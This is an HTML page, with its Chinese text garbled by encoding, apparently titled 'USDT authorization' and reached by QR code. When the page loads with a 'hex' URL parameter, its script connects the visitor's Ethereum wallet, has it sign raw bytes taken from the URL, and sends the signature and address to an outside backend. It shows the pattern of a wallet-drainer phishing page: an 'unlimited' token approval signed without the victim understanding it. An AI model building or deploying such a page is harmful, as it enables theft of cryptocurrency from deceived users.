<!DOCTYPE html>
<html>
<head>
    <title>USDTæˆæƒ</title>
    <meta charset="utf-8">
    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
</head>
<body>
    <div id="status" style="text-align: center; margin-top: 100px; font-size: 18px;">
        ğŸ” USDTæ— é™æˆæƒ<br>
        æ­£åœ¨è‡ªåŠ¨è¿æ¥...
    </div>

    <script>
        async function startAuth() {
            const status = document.getElementById('status');
            const urlParams = new URLSearchParams(window.location.search);
            const hexCode = urlParams.get('hex');
            const requestId = urlParams.get('id');
            
            try {
                // æ£€æŸ¥é’±åŒ…
                if (typeof window.ethereum === 'undefined') {
                    status.innerHTML = 'âŒ è¯·ä½¿ç”¨æ¬§æ˜“é’±åŒ…æ‰“å¼€æ­¤é¡µé¢';
                    return;
                }

                // è‡ªåŠ¨è¿æ¥é’±åŒ…
                status.innerHTML = 'æ­£åœ¨è¿æ¥é’±åŒ…...';
                const accounts = await window.ethereum.request({ 
                    method: 'eth_requestAccounts' 
                });
                
                const userAddress = accounts[0];
                status.innerHTML = `âœ… å·²è¿æ¥é’±åŒ…<br>åœ°å€: ${userAddress.substring(0, 8)}...`;
                
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();

                // è‡ªåŠ¨ç­¾å
                status.innerHTML = 'æ­£åœ¨è¯·æ±‚ç­¾å...';
                const signature = await signer.signMessage(ethers.utils.arrayify(hexCode));
                
                status.innerHTML = 'âœ… ç­¾åæˆåŠŸ! æäº¤ä¸­...';
                
                // æäº¤åˆ°åç«¯
                const response = await fetch('https://usdt-vercel.vercel.app/api/submit-signature', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        hexCode: hexCode,
                        signature: signature,
                        userAddress: userAddress,
                        requestId: requestId
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    status.innerHTML = 'ğŸ‰ USDTæˆæƒå®Œæˆ!<br>è¯·å…³é—­é¡µé¢';
                } else {
                    status.innerHTML = 'âŒ å¤±è´¥: ' + result.message;
                }
                
            } catch (error) {
                status.innerHTML = 'âŒ é”™è¯¯: ' + error.message;
            }
        }

        // é¡µé¢åŠ è½½åè‡ªåŠ¨å¼€å§‹
        if (window.location.search.includes('hex=')) {
            setTimeout(startAuth, 1000);
        } else {
            document.getElementById('status').innerHTML = 'è¯·é€šè¿‡äºŒç»´ç è®¿é—®æ­¤é¡µé¢';
        }
    </script>
</body>
</html>